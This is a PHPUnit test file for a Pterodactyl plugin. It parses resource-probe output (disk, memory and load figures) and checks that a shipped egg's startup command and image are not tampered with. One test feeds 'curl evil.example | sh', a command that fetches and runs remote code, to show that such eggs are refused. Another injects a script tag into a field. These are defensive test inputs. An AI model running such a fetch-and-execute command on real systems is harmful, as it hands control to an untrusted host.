<?php

namespace NodeResources\Tests;

use NodeResources\Support\Df;
use NodeResources\Support\LoadAvg;
use NodeResources\Support\Meminfo;
use NodeResources\Support\Probe;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class ProbeTest extends TestCase
{
    private const string DF = '/dev/sda2 479152124 301231288 153502340 67% /home/container';

    private const string MEM = 'MemTotal: 16318452 kB;MemFree: 1000000 kB;MemAvailable: 11833724 kB;Buffers: 2000 kB;Cached: 4000000 kB;';

    private static function line(array $overrides = []): string
    {
        $data = array_merge([
            'v' => 1,
            'ts' => 1760000000,
            'cpus' => 8,
            'df' => self::DF,
            'mem' => self::MEM,
            'load' => '0.52 0.40 0.30 1/200 1234',
        ], $overrides);

        return 'NRPROBE '.json_encode($data);
    }

    public function testParsesAWholeLine(): void
    {
        $reading = Probe::parseLine(self::line());

        $this->assertSame(1760000000, $reading['ts']);
        $this->assertSame(8, $reading['cpus']);
        $this->assertSame(479152124 * 1024, $reading['disk_total']);
        $this->assertSame(301231288 * 1024, $reading['disk_used']);
        $this->assertSame(153502340 * 1024, $reading['disk_free']);
        $this->assertSame(16318452 * 1024, $reading['mem_total']);
        $this->assertSame(11833724 * 1024, $reading['mem_available']);
        $this->assertSame(0.52, $reading['load1']);
        $this->assertSame(0.30, $reading['load15']);
    }

    public function testIgnoresColourCodesAndConsolePrefixes(): void
    {
        $this->assertNotNull(Probe::parseLine("\x1B[0m\x1B[1m".self::line()."\r"));
        $this->assertNotNull(Probe::parseLine('[Pterodactyl Daemon]: '.self::line()));
        $this->assertNotNull(Probe::parseLine('container@pterodactyl~ '.self::line()));
    }

    public function testAMissingLoadIsFine(): void
    {
        $reading = Probe::parseLine(self::line(['load' => '']));

        $this->assertNotNull($reading);
        $this->assertNull($reading['load1']);
    }

    /** @return iterable<string, array{string}> */
    public static function garbage(): iterable
    {
        yield 'empty' => [''];
        yield 'plain text' => ['The server is running'];
        yield 'the command echo' => ['container@pterodactyl~ ash ./nrprobe.sh'];
        yield 'no json' => ['NRPROBE'];
        yield 'not json' => ['NRPROBE {nope}'];
        yield 'truncated' => [substr(self::line(), 0, 80)];
        yield 'json list' => ['NRPROBE [1,2,3]'];
        yield 'json scalar' => ['NRPROBE 5'];
        yield 'no timestamp' => [self::line(['ts' => null])];
        yield 'string timestamp' => [self::line(['ts' => '1760000000'])];
        yield 'timestamp from 1970' => [self::line(['ts' => 5])];
        yield 'timestamp far future' => [self::line(['ts' => 99999999999])];
        yield 'negative cpus' => [self::line(['cpus' => -1])];
        yield 'silly cpus' => [self::line(['cpus' => 100000])];
        yield 'cpus as text' => [self::line(['cpus' => 'many'])];
        yield 'newer protocol' => [self::line(['v' => 2])];
        yield 'df missing' => [self::line(['df' => null])];
        yield 'df garbage' => [self::line(['df' => 'df: /home/container: No such file'])];
        yield 'df as number' => [self::line(['df' => 12])];
        yield 'mem garbage' => [self::line(['mem' => 'grep: /proc/meminfo: nope'])];
        yield 'mem empty' => [self::line(['mem' => ''])];
        yield 'lowercase marker' => [strtolower(self::line())];
        yield 'huge line' => [self::line(['df' => str_repeat('x', 5000)])];
    }

    #[DataProvider('garbage')]
    public function testGarbageIsIgnored(string $line): void
    {
        $this->assertNull(Probe::parseLine($line));
    }

    public function testTheNewestValidLineWins(): void
    {
        $lines = [
            self::line(['ts' => 1760000000]),
            'something else',
            self::line(['ts' => 1760000120, 'cpus' => 4]),
            self::line(['ts' => 1760000060]),
            'NRPROBE {broken',
        ];

        $this->assertSame(1760000120, Probe::latest($lines)['ts']);
        $this->assertSame(4, Probe::latest($lines)['cpus']);
    }

    public function testNothingValidGivesNull(): void
    {
        $this->assertNull(Probe::latest([]));
        $this->assertNull(Probe::latest(['a', 'NRPROBE {', '']));
    }

    public function testMarkupInsideTextFieldsOnlyHarmsTheParsedNumbers(): void
    {
        $reading = Probe::parseLine(self::line(['df' => '<script>alert(1)</script> 100 50 50 50% /home/container']));

        $this->assertSame(100 * 1024, $reading['disk_total']);
        $this->assertArrayNotHasKey('df', $reading);
    }

    public function testDfWithHeaderAndOtherBlockSizes(): void
    {
        $this->assertSame(
            ['total' => 1000 * 1024, 'used' => 400 * 1024, 'free' => 600 * 1024],
            Df::parse("Filesystem     1024-blocks Used Available Capacity Mounted on\n/dev/sda1 1000 400 600 40% /home/container")
        );
        $this->assertSame(
            ['total' => 1000 * 512, 'used' => 400 * 512, 'free' => 600 * 512],
            Df::parse("Filesystem 512-blocks Used Available Capacity Mounted on\n/dev/sda1 1000 400 600 40% /home/container")
        );
        $this->assertSame(
            ['total' => 1000 * 1024, 'used' => 400 * 1024, 'free' => 600 * 1024],
            Df::parse("Filesystem 1K-blocks Used Available Capacity Mounted on\n/dev/sda1 1000 400 600 40% /home/container")
        );
    }

    public function testDfNamesWithSpacesAndDashes(): void
    {
        $this->assertSame(10 * 1024, Df::parse('my pool/data set 10 4 6 40% /home/container')['total']);
        $this->assertSame(10 * 1024, Df::parse('tmpfs 10 4 6 - /home/container')['total']);
        $this->assertSame(10 * 1024, Df::parse("  /dev/mapper/vg-root 10 4 6 40% /\n")['total']);
    }

    /** @return iterable<string, array{string}> */
    public static function badDf(): iterable
    {
        yield 'empty' => [''];
        yield 'header only' => ['Filesystem 1024-blocks Used Available Capacity Mounted on'];
        yield 'error' => ['df: /home/container: No such file or directory'];
        yield 'free bigger than total' => ['/dev/sda1 100 50 500 50% /x'];
        yield 'zero size' => ['/dev/sda1 0 0 0 0% /x'];
        yield 'too many digits' => ['/dev/sda1 99999999999999999999 1 1 1% /x'];
    }

    #[DataProvider('badDf')]
    public function testBadDfIsNull(string $text): void
    {
        $this->assertNull(Df::parse($text));
    }

    public function testMeminfo(): void
    {
        $this->assertSame(
            ['total' => 16318452 * 1024, 'available' => 11833724 * 1024],
            Meminfo::parse("MemTotal:       16318452 kB\nMemFree:  100 kB\nMemAvailable:   11833724 kB\nSwapTotal: 0 kB")
        );
        // Separators the probe uses.
        $this->assertSame(1000 * 1024, Meminfo::parse('MemTotal: 1000 kB|MemAvailable: 400 kB|')['total']);
        $this->assertSame(400 * 1024, Meminfo::parse('MemTotal: 1000 kB;MemAvailable: 400 kB;')['available']);
    }

    public function testMeminfoOnOldKernelsAddsFreeBuffersAndCache(): void
    {
        $this->assertSame(
            ['total' => 1000 * 1024, 'available' => 700 * 1024],
            Meminfo::parse("MemTotal: 1000 kB\nMemFree: 100 kB\nBuffers: 200 kB\nCached: 400 kB")
        );
    }

    public function testMeminfoNeverReportsMoreAvailableThanTotal(): void
    {
        $this->assertSame(1000 * 1024, Meminfo::parse("MemTotal: 1000 kB\nMemAvailable: 5000 kB")['available']);
    }

    public function testMeminfoWithoutTotalOrFreeIsNull(): void
    {
        $this->assertNull(Meminfo::parse(''));
        $this->assertNull(Meminfo::parse('MemAvailable: 5 kB'));
        $this->assertNull(Meminfo::parse('MemTotal: 5 kB'));
        $this->assertNull(Meminfo::parse('MemTotal: lots'));
    }

    public function testLoadAvg(): void
    {
        $this->assertSame([1 => 0.52, 5 => 0.4, 15 => 0.3], LoadAvg::parse('0.52 0.40 0.30 1/200 1234'));
        $this->assertSame([1 => 12.0, 5 => 3.0, 15 => 1.5], LoadAvg::parse("12 3 1.5\n"));
        $this->assertNull(LoadAvg::parse(''));
        $this->assertNull(LoadAvg::parse('cat: /proc/loadavg'));
        $this->assertNull(LoadAvg::parse('-1 0 0'));
    }

    public function testAnEggWithTheShippedStartupAndImageMatches(): void
    {
        $shipped = json_decode((string) file_get_contents(dirname(__DIR__, 2).'/resources/node-probe-egg.json'), true);

        $this->assertTrue(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', ['Alpine' => 'ghcr.io/pterodactyl/yolks:alpine']));
        // Labels and surrounding whitespace do not matter.
        $this->assertTrue(Probe::eggMatches($shipped, " ash ./nrprobe.sh\n", ['Other' => 'ghcr.io/pterodactyl/yolks:alpine']));
    }

    public function testAnEggWithAnotherStartupOrImageIsRefused(): void
    {
        $shipped = json_decode((string) file_get_contents(dirname(__DIR__, 2).'/resources/node-probe-egg.json'), true);

        $this->assertFalse(Probe::eggMatches($shipped, 'curl evil.example | sh', ['Alpine' => 'ghcr.io/pterodactyl/yolks:alpine']));
        $this->assertFalse(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', ['Alpine' => 'evil/image:latest']));
        $this->assertFalse(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', []));
        $this->assertFalse(Probe::eggMatches($shipped, 'ash ./nrprobe.sh', null));
        $this->assertFalse(Probe::eggMatches([], 'ash ./nrprobe.sh', ['a' => 'b']));
    }
}
